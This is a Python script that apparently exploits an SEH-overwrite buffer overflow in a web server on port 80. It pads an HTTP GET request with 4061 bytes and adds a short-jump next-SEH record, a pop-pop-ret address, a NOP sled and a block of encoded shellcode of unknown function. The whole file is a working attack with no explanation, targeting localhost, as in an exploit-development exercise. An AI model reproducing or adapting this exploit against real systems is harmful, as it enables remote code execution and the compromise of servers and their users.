import socket
import os
import sys
from struct import pack

ip = "127.0.0.1"
port = 80

#\x0a\x0d\x20\x25\x2f\x5c

junk = b"A" * 4061
nseh = b"\xeb\x06\x90\x90"
seh = pack("<L", 0x100103fe) #b'CCCC'
nop = b'\x90' * 10
# shellcode = b'\xCC' * 500
shellcode =  b""
shellcode += b"\xb8\x54\xd2\x3c\xac\xd9\xcd\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x31\x31\x42\x13\x03\x42\x13"
shellcode += b"\x83\xc2\x50\x30\xc9\x50\xb0\x36\x32\xa9\x40"
shellcode += b"\x57\xba\x4c\x71\x57\xd8\x05\x21\x67\xaa\x48"
shellcode += b"\xcd\x0c\xfe\x78\x46\x60\xd7\x8f\xef\xcf\x01"
shellcode += b"\xa1\xf0\x7c\x71\xa0\x72\x7f\xa6\x02\x4b\xb0"
shellcode += b"\xbb\x43\x8c\xad\x36\x11\x45\xb9\xe5\x86\xe2"
shellcode += b"\xf7\x35\x2c\xb8\x16\x3e\xd1\x08\x18\x6f\x44"
shellcode += b"\x03\x43\xaf\x66\xc0\xff\xe6\x70\x05\xc5\xb1"
shellcode += b"\x0b\xfd\xb1\x43\xda\xcc\x3a\xef\x23\xe1\xc8"
shellcode += b"\xf1\x64\xc5\x32\x84\x9c\x36\xce\x9f\x5a\x45"
shellcode += b"\x14\x15\x79\xed\xdf\x8d\xa5\x0c\x33\x4b\x2d"
shellcode += b"\x02\xf8\x1f\x69\x06\xff\xcc\x01\x32\x74\xf3"
shellcode += b"\xc5\xb3\xce\xd0\xc1\x98\x95\x79\x53\x44\x7b"
shellcode += b"\x85\x83\x27\x24\x23\xcf\xc5\x31\x5e\x92\x83"
shellcode += b"\xc4\xec\xa8\xe1\xc7\xee\xb2\x55\xa0\xdf\x39"
shellcode += b"\x3a\xb7\xdf\xeb\x7f\x57\x02\x3e\x75\xf0\x9b"
shellcode += b"\xab\x34\x9d\x1b\x06\x7a\x98\x9f\xa3\x02\x5f"
shellcode += b"\xbf\xc1\x07\x1b\x07\x39\x75\x34\xe2\x3d\x2a"
shellcode += b"\x35\x27\x5e\xad\xa5\xab\x8f\x48\x4e\x49\xd0"
payload = junk + nseh + seh + nop + shellcode

buffer = b"GET "
buffer += payload
buffer += b" HTTP/1.1\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()